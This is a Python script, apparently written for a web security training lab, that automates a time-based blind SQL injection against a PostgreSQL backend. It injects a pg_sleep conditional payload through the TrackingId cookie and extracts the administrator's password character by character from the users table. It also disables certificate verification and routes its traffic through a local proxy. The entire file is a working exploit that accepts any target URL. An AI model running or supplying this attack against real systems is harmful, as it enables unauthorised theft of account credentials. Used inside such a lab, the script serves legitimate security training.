# Source - https://youtu.be/o__q8CzK2ts
# Rana Khalil Web Security Academy (used Blind SQLi w/conditional errors as starter)

import sys
import requests
import urllib3
import urllib.parse
import time
# Disable certificate warnings on requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set proxies to run requests through proxy for debugging
proxies = { 
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def sqli_password(url,tracking, sid):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126): #Uses ASCII table for values, includes special characters
            t_0 = time.time()
            sqli_payload = f"'|| (SELECT CASE WHEN(username='administrator' AND ASCII(SUBSTR(password,{i},1))='{j}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--"
            #print(sqli_payload)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            #print(sqli_payload_encoded)
            cookies = {'TrackingId': tracking+sqli_payload_encoded, 'session': sid}
            #print(cookies)
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            #print(r)
            t_1 = time.time() - t_0
            if t_1 > 5:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main ():
    try:
        url = sys.argv[1].strip()
        tracking = sys.argv[2].strip()
        sid = sys.argv[3].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com TrackingId SessionId')
        sys.exit(-1)

    print("(+) Retrieving administrator password...")
    sqli_password(url, tracking, sid)


if __name__ == "__main__":
    main()
